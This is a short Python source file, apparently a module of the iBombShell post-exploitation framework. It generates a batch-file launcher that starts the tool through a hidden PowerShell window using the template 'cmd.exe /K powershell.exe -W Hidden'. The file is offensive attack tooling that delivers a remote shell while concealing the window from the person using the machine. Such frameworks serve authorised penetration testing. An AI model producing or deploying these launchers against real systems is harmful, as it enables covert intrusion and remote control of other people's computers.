from termcolor import colored, cprint
from module import ModuleGenerate
from printib import print_ok, print_info, print_error

class CustomModule(ModuleGenerate):

    def __init__(self):
        information = {"Name": "Generate CMD iBombShell ",
                       "Description": "This module generates a code to launch iBombShell from CMD",
                       "Author": "@josueencinar"}
        # Constructor of the parent class
        super(CustomModule, self).__init__(information)


    # This module must be always implemented, it is called by the run option
    def run_module(self):
        cmd = "cmd.exe /K powershell.exe -W Hidden {} {} "
        self.run(cmd, "bat")